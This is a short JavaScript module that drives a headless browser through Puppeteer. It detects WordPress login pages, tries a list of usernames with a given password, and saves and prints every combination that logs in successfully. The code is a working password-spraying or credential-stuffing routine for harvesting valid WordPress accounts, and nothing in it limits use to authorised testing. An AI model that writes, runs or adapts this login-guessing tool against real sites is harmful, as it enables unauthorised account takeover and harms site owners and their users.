const {getBrowser, launchBrowser} = require('./helpers/puppeteer');
const { getLoginPage, isWordPressLoginPage, tryLogin, takeScreenshot } = require('./utils');
const {saveItem} = require('./helpers/outputSaver')

async function handleLogin(url, logins, password) {
	let browser = getBrowser();
	let page;
  try {
		if (!browser) {
      throw new Error('Failed to get browser');
    }
		page = await browser.newPage();
		
		
		await page.goto(url, { waitUntil: 'networkidle2'});
		const isWordPress = await isWordPressLoginPage(page);

		if (isWordPress) {
			for (const login of logins) {
				const result = await tryLogin(page, login, password);
				if (result == 'good') {
					saveItem({url, login, password})
					console.log(`\n--- * --- * --- * ---\n`);
					console.log(`Result is ${result}. URL: ${url}, login: ${login}, password: ${password}`);
					console.log(`\n--- * --- * --- * ---\n`);
				} else {
					console.log(`\n--- * --- * --- * ---\n`);
					console.log(`URL: ${url}, Result is ${result}.`);
					console.log(`\n--- * --- * --- * ---\n`);
				}
			}
		} else {
			console.log(`URL: ${url}, Error: Not a WordPress login page`);
		}
	} catch (error) {
		console.error('Error while trying to login', error?.message);
	} finally {
		page?.close()
	}
}

module.exports = { handleLogin };